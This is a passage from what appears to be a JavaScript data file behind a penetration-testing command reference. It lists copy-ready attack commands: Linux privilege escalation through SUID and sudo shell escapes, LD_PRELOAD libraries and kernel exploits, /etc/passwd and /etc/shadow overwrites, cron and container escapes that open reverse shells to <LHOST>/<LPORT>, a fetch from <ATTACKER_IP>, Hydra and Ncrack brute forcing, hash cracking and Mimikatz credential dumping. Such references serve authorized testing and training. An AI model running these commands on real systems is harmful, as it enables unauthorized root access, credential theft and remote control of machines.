          { title: "SUID vim Shell", desc: "Escalate via SUID vim", cmd: "vim -c ':!/bin/sh'", tags: ["essential"], note: "GTFOBins: vim" },
          { title: "SUID python Shell", desc: "Escalate via SUID python", cmd: "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'", tags: ["essential"], note: "GTFOBins: python" },
          { title: "SUID nmap Interactive", desc: "Escalate via SUID nmap (old versions)", cmd: "nmap --interactive\n!sh", tags: ["essential"], note: "GTFOBins: nmap (versions 2.02-5.21)" },
          { title: "SUID cp Overwrite Passwd", desc: "Overwrite /etc/passwd via SUID cp", cmds: ["openssl passwd -1 newpassword", "echo 'root2:<HASH>:0:0:root:/root:/bin/bash' >> /tmp/passwd", "cp /tmp/passwd /etc/passwd"], tags: ["advanced"], note: "GTFOBins: cp" },
          { title: "SUID env Shell", desc: "Escalate via SUID env", cmd: "env /bin/sh -p", tags: ["essential"] },
        ]
      },
      {
        name: "Sudo Misconfigurations",
        commands: [
          { title: "List Sudo Privileges", desc: "Show what current user can run as sudo", cmd: "sudo -l", tags: ["essential"] },
          { title: "Sudo bash", desc: "Direct root shell via sudo", cmd: "sudo bash", tags: ["essential"] },
          { title: "Sudo vi/vim Shell", desc: "Escape to shell from sudo vim", cmd: "sudo vim -c ':!/bin/bash'", tags: ["essential"] },
          { title: "Sudo find Exec", desc: "Command execution via sudo find", cmd: "sudo find / -exec /bin/bash \\; -quit", tags: ["essential"] },
          { title: "Sudo python Shell", desc: "Root shell via sudo python", cmd: "sudo python3 -c 'import os; os.system(\"/bin/bash\")'", tags: ["essential"] },
          { title: "Sudo perl Shell", desc: "Root shell via sudo perl", cmd: "sudo perl -e 'exec \"/bin/bash\";'", tags: ["essential"] },
          { title: "Sudo awk Shell", desc: "Root shell via sudo awk", cmd: "sudo awk 'BEGIN {system(\"/bin/bash\")}'", tags: ["essential"] },
          { title: "Sudo less Shell", desc: "Shell escape from sudo less", cmd: "sudo less /etc/passwd\n!/bin/bash", tags: ["essential"] },
          { title: "Sudo more Shell", desc: "Shell escape from sudo more", cmd: "sudo more /etc/passwd\n!/bin/bash", tags: ["essential"] },
          { title: "Sudo nmap Shell", desc: "Root shell via sudo nmap", cmd: "echo 'os.execute(\"/bin/bash\")' > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse", tags: ["essential"] },
          { title: "Sudo tee Write Files", desc: "Write to privileged files via sudo tee", cmd: "echo 'root2:$(openssl passwd -1 pass123):0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd", tags: ["essential"] },
          { title: "Sudo wget File Overwrite", desc: "Overwrite files via sudo wget", cmd: "sudo wget http://<ATTACKER_IP>/malicious_passwd -O /etc/passwd", tags: ["essential"] },
          { title: "Sudo cp File Overwrite", desc: "Copy files as root via sudo cp", cmd: "sudo cp /tmp/evil_shadow /etc/shadow", tags: ["essential"] },
          { title: "Sudo env Shell", desc: "Root shell via sudo env", cmd: "sudo env /bin/bash", tags: ["essential"] },
          { title: "Sudo tar Shell", desc: "Root shell via sudo tar", cmd: "sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash", tags: ["essential"] },
          { title: "Sudo zip Shell", desc: "Root shell via sudo zip", cmd: "sudo zip /tmp/test.zip /tmp/test -T --unzip-command=\"sh -c /bin/bash\"", tags: ["essential"] },
          { title: "Sudo git Shell", desc: "Root shell via sudo git", cmd: "sudo git -p help config\n!/bin/bash", tags: ["essential"] },
          { title: "LD_PRELOAD Escalation", desc: "Abuse LD_PRELOAD in sudo configuration", cmds: ["echo '#include <stdio.h>\\n#include <stdlib.h>\\nvoid _init(){unsetenv(\"LD_PRELOAD\");setgid(0);setuid(0);system(\"/bin/bash\");}' > /tmp/pe.c", "gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles", "sudo LD_PRELOAD=/tmp/pe.so <ALLOWED_COMMAND>"], tags: ["advanced"], note: "Only works if env_keep contains LD_PRELOAD" },
          { title: "LD_LIBRARY_PATH Escalation", desc: "Abuse LD_LIBRARY_PATH in sudo configuration", cmds: ["ldd <SUID_OR_SUDO_BINARY>", "# Create malicious shared library matching a linked .so", "gcc -fPIC -shared -o /tmp/libfoo.so /tmp/evil.c", "sudo LD_LIBRARY_PATH=/tmp <ALLOWED_COMMAND>"], tags: ["advanced"] },
          { title: "CVE-2021-3156 (Baron Samedit)", desc: "Sudo heap overflow affecting versions < 1.9.5p2", cmd: "sudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)')", tags: ["advanced"], note: "Affects sudo versions 1.8.2-1.8.31p2, 1.9.0-1.9.5p1" },
        ]
      },
      {
        name: "Scheduled Task Exploitation",
        commands: [
          { title: "Enumerate Cron Jobs", desc: "List all cron jobs for current user", cmd: "crontab -l", tags: ["essential"] },
          { title: "System Cron Jobs", desc: "Check system-wide cron jobs", cmds: ["cat /etc/crontab", "ls -la /etc/cron.d/", "ls -la /etc/cron.daily/", "ls -la /etc/cron.hourly/"], tags: ["essential"] },
          { title: "Find Writable Cron Scripts", desc: "Find cron scripts that are world-writable", cmd: "find /etc/cron* -writable -type f 2>/dev/null", tags: ["essential"] },
          { title: "Monitor Cron with pspy", desc: "Monitor process creation to find hidden cron jobs", cmd: "./pspy64", tags: ["essential", "tool"], note: "Upload pspy to target first" },
          { title: "Tar Wildcard Injection", desc: "Exploit tar with wildcard in cron job", cmds: ["echo '' > '/path/to/cron/dir/--checkpoint=1'", "echo '' > '/path/to/cron/dir/--checkpoint-action=exec=sh shell.sh'", "echo '#!/bin/bash\\nbash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' > /path/to/cron/dir/shell.sh"], tags: ["advanced"], note: "Works when cron runs: tar czf backup.tar.gz *" },
          { title: "PATH Variable Exploitation", desc: "Exploit cron job that calls commands without full path", cmds: ["echo '#!/bin/bash\\nbash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' > /tmp/<COMMAND_NAME>", "chmod +x /tmp/<COMMAND_NAME>", "export PATH=/tmp:$PATH"], tags: ["advanced"], note: "Works when cron PATH includes writable directory or cron script uses relative paths" },
          { title: "Systemd Timer Enum", desc: "List systemd timers", cmd: "systemctl list-timers --all", tags: ["essential"] },
        ]
      },
      {
        name: "Linux Capabilities",
        commands: [
          { title: "List All Capabilities", desc: "Find all binaries with capabilities set", cmd: "getcap -r / 2>/dev/null", tags: ["essential"] },
          { title: "cap_setuid Python", desc: "Escalate via python with cap_setuid", cmd: "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'", tags: ["essential"] },
          { title: "cap_setuid Perl", desc: "Escalate via perl with cap_setuid", cmd: "perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/bash\";'", tags: ["essential"] },
          { title: "cap_dac_read_search", desc: "Read any file on the system", cmd: "# Binary with cap_dac_read_search can read any file\n# Example: tar with cap_dac_read_search\ntar czf /tmp/shadow.tar.gz /etc/shadow && tar xzf /tmp/shadow.tar.gz", tags: ["advanced"] },
          { title: "cap_net_bind_service", desc: "Bind to privileged ports (<1024)", cmd: "# Binary with cap_net_bind_service can bind to any port\npython3 -c 'import socket;s=socket.socket();s.bind((\"0.0.0.0\",80));s.listen(1)'", tags: ["advanced"] },
        ]
      },
      {
        name: "Writable Files & PATH Hijack",
        commands: [
          { title: "Writable /etc/passwd", desc: "Add root user to writable passwd file", cmds: ["openssl passwd -1 newpassword", "echo 'root2:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd", "su root2"], tags: ["essential"] },
          { title: "World-Writable Files", desc: "Find world-writable files", cmd: "find / -writable -type f ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null", tags: ["essential"] },
          { title: "World-Writable Directories", desc: "Find world-writable directories", cmd: "find / -writable -type d ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null", tags: ["essential"] },
          { title: "PATH Hijack via SUID Binary", desc: "Hijack PATH for SUID binary using relative command path", cmds: ["echo '#!/bin/bash\\n/bin/bash -p' > /tmp/service", "chmod +x /tmp/service", "export PATH=/tmp:$PATH", "<SUID_BINARY>"], tags: ["essential"], note: "Only works if SUID binary calls commands without absolute path" },
          { title: "Shared Library Hijack", desc: "Find shared library misconfigurations", cmds: ["# Find SUID binary and check libraries", "ldd <SUID_BINARY>", "# Check for writable library directories in search path", "strace <SUID_BINARY> 2>&1 | grep -i 'open.*\\.so'"], tags: ["advanced"] },
        ]
      },
      {
        name: "Kernel Exploits",
        commands: [
          { title: "Linux Exploit Suggester", desc: "Suggest kernel exploits based on kernel version", cmd: "perl linux-exploit-suggester.pl", tags: ["essential", "tool"] },
          { title: "Linux Exploit Suggester 2", desc: "Alternative exploit suggester (Python)", cmd: "python linux-exploit-suggester-2.py", tags: ["tool"] },
          { title: "DirtyPipe (CVE-2022-0847)", desc: "Kernel exploit for Linux 5.8-5.16.11", cmd: "./dirtypipe /etc/passwd 1 '${root_entry}'", tags: ["advanced"], note: "Affects Linux kernel 5.8 through 5.16.11, 5.15.25, 5.10.102" },
          { title: "DirtyCow (CVE-2016-5195)", desc: "Kernel exploit for race condition in memory management", cmd: "gcc -pthread dirty.c -o dirty -lcrypt && ./dirty newpassword", tags: ["advanced"], note: "Affects Linux kernel < 4.8.3" },
          { title: "PwnKit (CVE-2021-4034)", desc: "Polkit pkexec local privilege escalation", cmd: "gcc pwnkit.c -o pwnkit && ./pwnkit", tags: ["advanced"], note: "Affects most Linux distros with polkit installed (2009-2022)" },
          { title: "Check Kernel Version for Exploits", desc: "Quick kernel version identification", cmd: "uname -r", tags: ["essential"] },
        ]
      },
      {
        name: "Docker & Container Escape",
        commands: [
          { title: "Check Docker Group", desc: "Check if current user is in docker group", cmd: "id | grep -i docker", tags: ["essential"] },
          { title: "Docker Group Escape (Mount Host)", desc: "Mount host filesystem to escape container", cmd: "docker run -v /:/hostfs -it alpine chroot /hostfs /bin/bash", tags: ["essential"] },
          { title: "Docker Socket Escape", desc: "Escape via exposed Docker socket", cmd: "docker -H unix:///var/run/docker.sock run -v /:/hostfs -it alpine chroot /hostfs /bin/bash", tags: ["essential"] },
          { title: "LXD Group Escape", desc: "Exploit lxd group membership for root", cmds: ["lxc image import alpine.tar.gz --alias alpine", "lxc init alpine privesc -c security.privileged=true", "lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true", "lxc start privesc", "lxc exec privesc /bin/sh"], tags: ["essential"], note: "Need to upload alpine image to target first" },
          { title: "Check Container Environment", desc: "Determine if running inside a container", cmds: ["cat /proc/1/cgroup 2>/dev/null | grep -i docker", "ls -la /.dockerenv 2>/dev/null", "hostname"], tags: ["essential"] },
          { title: "Privileged Container Escape", desc: "Escape from privileged Docker container", cmds: ["mkdir /tmp/escape && mount -t cgroup -o rdma cgroup /tmp/escape", "echo 1 > /tmp/escape/notify_on_release", "host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)", "echo \"$host_path/cmd\" > /tmp/escape/release_agent", "echo '#!/bin/bash' > /cmd", "echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' >> /cmd", "chmod +x /cmd", "sh -c 'echo 0 > /tmp/escape/cgroup.procs'"], tags: ["advanced"] },
        ]
      },
      {
        name: "NFS Abuse",
        commands: [
          { title: "Check NFS Exports", desc: "View NFS shares from remote", cmd: "showmount -e <TARGET_IP>", tags: ["essential"] },
          { title: "Check no_root_squash", desc: "Identify NFS shares with no_root_squash", cmd: "cat /etc/exports", tags: ["essential"], note: "no_root_squash allows root on client to be root on NFS share" },
          { title: "Mount NFS Share", desc: "Mount NFS share on attacker machine", cmd: "mkdir /tmp/nfs && mount -t nfs <TARGET_IP>:/<SHARE> /tmp/nfs", tags: ["essential"] },
          { title: "NFS SUID Shell Exploit", desc: "Create SUID binary on NFS share as root", cmds: ["# On attacker (as root) after mounting NFS share:", "cp /bin/bash /tmp/nfs/suid_bash", "chmod u+s /tmp/nfs/suid_bash", "# On target:", "/path/to/nfs/suid_bash -p"], tags: ["essential"] },
        ]
      },
      {
        name: "Automated Scanners",
        commands: [
          { title: "LinPEAS", desc: "Comprehensive Linux privilege escalation scanner", cmd: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh", tags: ["essential", "tool"] },
          { title: "LinPEAS (Uploaded)", desc: "Run LinPEAS after uploading to target", cmd: "chmod +x linpeas.sh && ./linpeas.sh -a", tags: ["essential", "tool"] },
          { title: "LinEnum", desc: "Linux enumeration and privilege escalation script", cmd: "chmod +x LinEnum.sh && ./LinEnum.sh -t", tags: ["tool"] },
          { title: "Pspy Process Monitor", desc: "Monitor processes without root privileges", cmd: "./pspy64", tags: ["essential", "tool"], note: "Excellent for finding cron jobs and hidden processes" },
          { title: "Linux Smart Enumeration", desc: "Smart Linux enumeration tool", cmd: "chmod +x lse.sh && ./lse.sh -l 2", tags: ["tool"] },
        ]
      }
    ]
  },

  // ─────────────────────────────────────────────
  // 10. Credential Attacks & Hash Cracking
  // ─────────────────────────────────────────────
  {
    id: "password-ops",
    name: "Credential Attacks & Hash Cracking",
    icon: "🔑",
    description: "Perform online brute force, offline hash cracking, credential dumping, and password spraying to compromise authentication mechanisms.",
    subcategories: [
      {
        name: "Online Brute Force",
        commands: [
          { title: "Hydra SSH Brute Force", desc: "Brute force SSH login", cmd: "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>", tags: ["essential", "tool"] },
          { title: "Hydra FTP Brute Force", desc: "Brute force FTP login", cmd: "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>", tags: ["essential", "tool"] },
          { title: "Hydra HTTP POST Form", desc: "Brute force web login form (POST)", cmd: "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form '/login:username=^USER^&password=^PASS^:F=incorrect'", tags: ["essential", "tool"], note: "Adjust form fields and failure string to match target" },
          { title: "Hydra HTTP GET Basic Auth", desc: "Brute force HTTP Basic Authentication", cmd: "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-get /protected/", tags: ["essential", "tool"] },
          { title: "Hydra RDP Brute Force", desc: "Brute force RDP login", cmd: "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt rdp://<TARGET_IP>", tags: ["tool"] },
          { title: "Hydra SMB Brute Force", desc: "Brute force SMB login", cmd: "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt smb://<TARGET_IP>", tags: ["tool"] },
          { title: "Hydra MySQL Brute Force", desc: "Brute force MySQL login", cmd: "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<TARGET_IP>", tags: ["tool"] },
          { title: "Hydra MSSQL Brute Force", desc: "Brute force MSSQL login", cmd: "hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://<TARGET_IP>", tags: ["tool"] },
          { title: "Hydra POP3 Brute Force", desc: "Brute force POP3 login", cmd: "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt pop3://<TARGET_IP>", tags: ["tool"] },
          { title: "Hydra IMAP Brute Force", desc: "Brute force IMAP login", cmd: "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt imap://<TARGET_IP>", tags: ["tool"] },
          { title: "Hydra SMTP Brute Force", desc: "Brute force SMTP login", cmd: "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt smtp://<TARGET_IP>", tags: ["tool"] },
          { title: "Hydra VNC Brute Force", desc: "Brute force VNC login", cmd: "hydra -P /usr/share/wordlists/rockyou.txt vnc://<TARGET_IP>", tags: ["tool"] },
          { title: "Hydra Telnet Brute Force", desc: "Brute force Telnet login", cmd: "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt telnet://<TARGET_IP>", tags: ["tool"] },
          { title: "Hydra with User List", desc: "Brute force with username and password lists", cmd: "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP> -t 4", tags: ["essential", "tool"] },
          { title: "Medusa SSH Brute Force", desc: "Medusa parallel brute forcer for SSH", cmd: "medusa -h <TARGET_IP> -u <USER> -P /usr/share/wordlists/rockyou.txt -M ssh", tags: ["tool"] },
          { title: "Ncrack RDP Brute Force", desc: "Ncrack brute forcer for RDP", cmd: "ncrack -vv --user <USER> -P /usr/share/wordlists/rockyou.txt rdp://<TARGET_IP>", tags: ["tool"] },
          { title: "Ncrack SSH Brute Force", desc: "Ncrack brute forcer for SSH", cmd: "ncrack -vv --user <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>", tags: ["tool"] },
          { title: "Ncrack FTP Brute Force", desc: "Ncrack brute forcer for FTP", cmd: "ncrack -vv --user <USER> -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>", tags: ["tool"] },
          { title: "Hydra SNMP Community Brute", desc: "Brute force SNMP community strings", cmd: "hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <TARGET_IP> snmp", tags: ["tool"] },
          { title: "Hydra HTTP POST JSON", desc: "Brute force JSON API login endpoint", cmd: "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form '/api/login:{\"username\":\"^USER^\",\"password\":\"^PASS^\"}:F=invalid:H=Content-Type: application/json'", tags: ["advanced", "tool"] },
          { title: "Hydra Multiple Targets", desc: "Brute force across multiple targets", cmd: "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt -M targets.txt ssh -t 4", tags: ["tool"] },
          { title: "Patator SSH Brute Force", desc: "Parallel brute force with patator", cmd: "patator ssh_login host=<TARGET_IP> user=<USER> password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Authentication failed.'", tags: ["tool"] },
          { title: "Patator HTTP POST Brute Force", desc: "Brute force web login with patator", cmd: "patator http_fuzz url='http://<TARGET_IP>/login' method=POST body='user=^USER^&pass=FILE0' 0=/usr/share/wordlists/rockyou.txt -x ignore:fgrep='Invalid'", tags: ["tool"] },
          { title: "Crowbar RDP Brute Force", desc: "Brute force RDP with crowbar", cmd: "crowbar -b rdp -s <TARGET_IP>/32 -u <USER> -C /usr/share/wordlists/rockyou.txt", tags: ["tool"] },
          { title: "Crowbar SSH Key Spray", desc: "Spray SSH keys against a target", cmd: "crowbar -b sshkey -s <TARGET_IP>/32 -u <USER> -k /path/to/keys/", tags: ["tool"] },
        ]
      },
      {
        name: "Offline Cracking (Hashcat)",
        commands: [
          { title: "Hashcat MD5", desc: "Crack MD5 hashes", cmd: "hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt", tags: ["essential", "tool"] },
          { title: "Hashcat SHA1", desc: "Crack SHA1 hashes", cmd: "hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt", tags: ["essential", "tool"] },
          { title: "Hashcat MD5Crypt", desc: "Crack Linux MD5 crypt ($1$)", cmd: "hashcat -m 500 hashes.txt /usr/share/wordlists/rockyou.txt", tags: ["essential", "tool"] },
          { title: "Hashcat NTLM", desc: "Crack Windows NTLM hashes", cmd: "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt", tags: ["essential", "tool"] },
          { title: "Hashcat SHA256", desc: "Crack SHA256 hashes", cmd: "hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt", tags: ["essential", "tool"] },
          { title: "Hashcat SHA512", desc: "Crack SHA512 hashes", cmd: "hashcat -m 1700 hashes.txt /usr/share/wordlists/rockyou.txt", tags: ["tool"] },
          { title: "Hashcat SHA512Crypt", desc: "Crack Linux SHA512 crypt ($6$)", cmd: "hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt", tags: ["essential", "tool"] },
          { title: "Hashcat bcrypt", desc: "Crack bcrypt hashes", cmd: "hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt", tags: ["tool"] },
          { title: "Hashcat NetNTLMv2", desc: "Crack NetNTLMv2 hashes (Responder captures)", cmd: "hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt", tags: ["essential", "tool"] },
          { title: "Hashcat NetNTLMv1", desc: "Crack NetNTLMv1 hashes", cmd: "hashcat -m 5500 hashes.txt /usr/share/wordlists/rockyou.txt", tags: ["tool"] },
          { title: "Hashcat Kerberoast (TGS-REP)", desc: "Crack Kerberoasted service ticket hashes", cmd: "hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt", tags: ["essential", "tool"] },
          { title: "Hashcat AS-REP Roast", desc: "Crack AS-REP roasted hashes", cmd: "hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt", tags: ["essential", "tool"] },
          { title: "Hashcat WPA2", desc: "Crack WPA2 handshake", cmd: "hashcat -m 2500 capture.hccapx /usr/share/wordlists/rockyou.txt", tags: ["tool"] },
          { title: "Hashcat Kerberos 5 TGS-REP RC4", desc: "Crack Kerberos 5 etype 23", cmd: "hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt", tags: ["tool"] },
          { title: "Hashcat Kerberos 5 TGS-REP AES256", desc: "Crack Kerberos 5 etype 18", cmd: "hashcat -m 19700 hashes.txt /usr/share/wordlists/rockyou.txt", tags: ["advanced"] },
          { title: "Hashcat MD4 (NTLM raw)", desc: "Crack raw MD4/NTLM", cmd: "hashcat -m 900 hashes.txt /usr/share/wordlists/rockyou.txt", tags: ["tool"] },
          { title: "Hashcat with Rules", desc: "Crack using rule-based transformations", cmd: "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule", tags: ["essential", "tool"] },
          { title: "Hashcat OneRuleToRuleThemAll", desc: "Crack with the most comprehensive rule", cmd: "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule", tags: ["tool"] },
          { title: "Hashcat Mask Attack", desc: "Brute force with pattern mask", cmd: "hashcat -m 1000 hashes.txt -a 3 '?u?l?l?l?l?d?d?d'", tags: ["essential", "tool"], note: "?u=upper ?l=lower ?d=digit ?s=special ?a=all" },
          { title: "Hashcat Combinator Attack", desc: "Combine two wordlists", cmd: "hashcat -m 1000 hashes.txt -a 1 wordlist1.txt wordlist2.txt", tags: ["tool"] },
          { title: "Hashcat Show Cracked", desc: "Display previously cracked hashes", cmd: "hashcat -m 1000 hashes.txt --show", tags: ["essential", "tool"] },
          { title: "Hashcat Mask Attack (Custom)", desc: "Brute force with custom mask charset", cmd: "hashcat -m 1000 hashes.txt -a 3 -1 '?u?l' -2 '?d?s' '?1?1?1?1?2?2?2?2'", tags: ["advanced", "tool"], note: "-1 defines custom charset 1, -2 defines charset 2" },
          { title: "Hashcat Hybrid Wordlist+Mask", desc: "Append mask pattern to wordlist entries", cmd: "hashcat -m 1000 hashes.txt -a 6 /usr/share/wordlists/rockyou.txt '?d?d?d?d'", tags: ["tool"], note: "Mode 6: wordlist+mask, Mode 7: mask+wordlist" },
          { title: "Hashcat Hybrid Mask+Wordlist", desc: "Prepend mask pattern to wordlist entries", cmd: "hashcat -m 1000 hashes.txt -a 7 '?d?d?d?d' /usr/share/wordlists/rockyou.txt", tags: ["tool"] },
          { title: "Hashcat PRINCE Attack", desc: "Generate word combinations from wordlist", cmd: "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --prince", tags: ["advanced", "tool"], note: "PRINCE combines words from the wordlist in various ways" },
          { title: "Hashcat DES Crypt", desc: "Crack DES crypt hashes", cmd: "hashcat -m 1500 hashes.txt /usr/share/wordlists/rockyou.txt", tags: ["tool"] },
          { title: "Hashcat MSSQL (2012+)", desc: "Crack MSSQL 2012/2014 hashes", cmd: "hashcat -m 1731 hashes.txt /usr/share/wordlists/rockyou.txt", tags: ["tool"] },
          { title: "Hashcat MySQL 4.1+", desc: "Crack MySQL SHA1 hashes", cmd: "hashcat -m 300 hashes.txt /usr/share/wordlists/rockyou.txt", tags: ["tool"] },
          { title: "Hashcat PostgreSQL MD5", desc: "Crack PostgreSQL MD5 hashes", cmd: "hashcat -m 12 hashes.txt /usr/share/wordlists/rockyou.txt", tags: ["tool"] },
          { title: "Hashcat scrypt", desc: "Crack scrypt hashes", cmd: "hashcat -m 8900 hashes.txt /usr/share/wordlists/rockyou.txt", tags: ["advanced", "tool"] },
          { title: "Hashcat DPAPI Master Key", desc: "Crack DPAPI master key files", cmd: "hashcat -m 15300 dpapi_hash.txt /usr/share/wordlists/rockyou.txt", tags: ["advanced", "tool"] },
          { title: "Hashcat Increment Mode", desc: "Try all lengths from min to max", cmd: "hashcat -m 1000 hashes.txt -a 3 '?a?a?a?a?a?a?a?a' --increment --increment-min=4 --increment-max=8", tags: ["tool"] },
        ]
      },
      {
        name: "Offline Cracking (John)",
        commands: [
          { title: "John Basic Crack", desc: "Crack hashes with default wordlist", cmd: "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt", tags: ["essential", "tool"] },
          { title: "John with Format", desc: "Crack with specified hash format", cmd: "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5", tags: ["essential", "tool"] },
          { title: "John NTLM", desc: "Crack NTLM hashes", cmd: "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=NT", tags: ["essential", "tool"] },
          { title: "John Show Cracked", desc: "Display cracked passwords", cmd: "john hashes.txt --show", tags: ["essential", "tool"] },
          { title: "John with Rules", desc: "Crack with mangling rules", cmd: "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64", tags: ["tool"] },
          { title: "ssh2john Extract Hash", desc: "Extract hash from SSH private key", cmd: "ssh2john id_rsa > ssh_hash.txt", tags: ["essential", "tool"] },
          { title: "zip2john Extract Hash", desc: "Extract hash from password-protected ZIP", cmd: "zip2john protected.zip > zip_hash.txt", tags: ["essential", "tool"] },
          { title: "rar2john Extract Hash", desc: "Extract hash from RAR archive", cmd: "rar2john protected.rar > rar_hash.txt", tags: ["tool"] },
          { title: "keepass2john Extract Hash", desc: "Extract hash from KeePass database", cmd: "keepass2john database.kdbx > keepass_hash.txt", tags: ["essential", "tool"] },
          { title: "office2john Extract Hash", desc: "Extract hash from Office document", cmd: "office2john protected.docx > office_hash.txt", tags: ["tool"] },
          { title: "pdf2john Extract Hash", desc: "Extract hash from password-protected PDF", cmd: "pdf2john protected.pdf > pdf_hash.txt", tags: ["tool"] },
          { title: "7z2john Extract Hash", desc: "Extract hash from 7-Zip archive", cmd: "7z2john protected.7z > 7z_hash.txt", tags: ["tool"] },
          { title: "gpg2john Extract Hash", desc: "Extract hash from GPG key", cmd: "gpg2john private.key > gpg_hash.txt", tags: ["tool"] },
          { title: "bitlocker2john Extract Hash", desc: "Extract hash from BitLocker volume", cmd: "bitlocker2john -i bitlocker_volume > bl_hash.txt", tags: ["tool"] },
          { title: "ansible2john Extract Hash", desc: "Extract hash from Ansible vault", cmd: "ansible2john vault.yml > ansible_hash.txt", tags: ["tool"] },
          { title: "krb5tgs2john Extract Hash", desc: "Extract Kerberos TGS ticket hash", cmd: "kirbi2john ticket.kirbi > krb_hash.txt", tags: ["tool"] },
          { title: "John SHA512Crypt Format", desc: "Crack Linux SHA512 crypt hashes", cmd: "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt", tags: ["tool"] },
          { title: "John bcrypt Format", desc: "Crack bcrypt hashes", cmd: "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt", tags: ["tool"] },
          { title: "John Kerberos TGS", desc: "Crack Kerberoasted TGS hashes", cmd: "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs", tags: ["essential", "tool"] },
          { title: "John AS-REP Hash", desc: "Crack AS-REP roasted hashes", cmd: "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep", tags: ["essential", "tool"] },
          { title: "John NetNTLMv2", desc: "Crack NetNTLMv2 hashes captured by Responder", cmd: "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2", tags: ["essential", "tool"] },
          { title: "John MSSQL Hash", desc: "Crack MSSQL password hashes", cmd: "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=mssql12", tags: ["tool"] },
          { title: "John MySQL Hash", desc: "Crack MySQL password hashes", cmd: "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=mysql-sha1", tags: ["tool"] },
          { title: "John List Formats", desc: "List all supported hash formats", cmd: "john --list=formats | tr ',' '\\n'", tags: ["essential", "tool"] },
          { title: "John Incremental Mode", desc: "Pure brute force with john", cmd: "john hashes.txt --incremental=Alnum --max-length=8", tags: ["tool"] },
          { title: "wpa2john Extract Hash", desc: "Extract hash from WPA handshake pcap", cmd: "wpa2john capture.pcap > wpa_hash.txt", tags: ["tool"] },
          { title: "vncpasswd Decrypt", desc: "Decrypt VNC stored password file", cmd: "vncpwd /path/to/.vnc/passwd", tags: ["tool"], note: "Or use: echo '<HEX_PASS>' | xxd -r -p | openssl enc -des-cbc -nopad -nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d" },
        ]
      },
      {
        name: "Hash Extraction & Identification",
        commands: [
          { title: "Hash Identifier", desc: "Identify hash type with hash-identifier", cmd: "hash-identifier", tags: ["essential", "tool"] },
          { title: "Hashid Identification", desc: "Identify hash type with hashid", cmd: "hashid '<HASH>'", tags: ["essential", "tool"] },
          { title: "Name That Hash", desc: "Identify hash with recommended hashcat/john mode", cmd: "nth --text '<HASH>'", tags: ["essential", "tool"] },
          { title: "Name That Hash from File", desc: "Identify hashes from a file", cmd: "nth --file hashes.txt", tags: ["tool"] },
        ]
      },
      {
        name: "Credential Dumping (Windows)",
        commands: [
          { title: "Mimikatz Logon Passwords", desc: "Dump plaintext passwords from memory", cmd: "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"", tags: ["essential", "tool"] },
